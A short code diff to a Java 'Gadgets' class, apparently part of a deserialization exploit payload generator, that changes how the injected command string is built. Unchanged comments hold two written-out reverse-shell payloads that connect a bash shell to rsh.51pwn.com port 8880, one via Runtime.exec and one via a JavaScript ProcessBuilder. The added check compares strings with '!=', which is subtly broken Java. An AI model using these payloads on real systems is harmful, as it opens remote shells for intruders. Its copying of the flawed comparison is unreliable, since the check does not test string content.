@@ -107,9 +107,7 @@ public class Gadgets {
         CtClass ctClass;
 
         // sample cmd
-        String cmd = "java.lang.Runtime.getRuntime().exec(\"" +
-            command.replace("\\", "\\\\").replace("\"", "\\\"") +
-            "\");";
+        String cmd = "";
         // export Custom_Code_51pwn='java.lang.Runtime.getRuntime().exec(new String[]{"bash" ,"-c" ,"exec bash -i &>/dev/tcp/rsh.51pwn.com/8880 <&1"});'
         // try {new javax.script.ScriptEngineManager().getEngineByName("JavaScript").eval("var x=new java.lang.ProcessBuilder(\"bash\",\"-c\",\"exec bash -i &>/dev/tcp/rsh.51pwn.com/8880 <&1\");x.start().getInputStream();");}catch (java.lang.Throwable e8876){}
         // # 1 env
@@ -135,6 +133,7 @@ public class Gadgets {
         }
 
         // 兼容原来的
+        if(""!=cmd)
         superC.makeClassInitializer().insertAfter(cmd);
 
         if (command != null) {
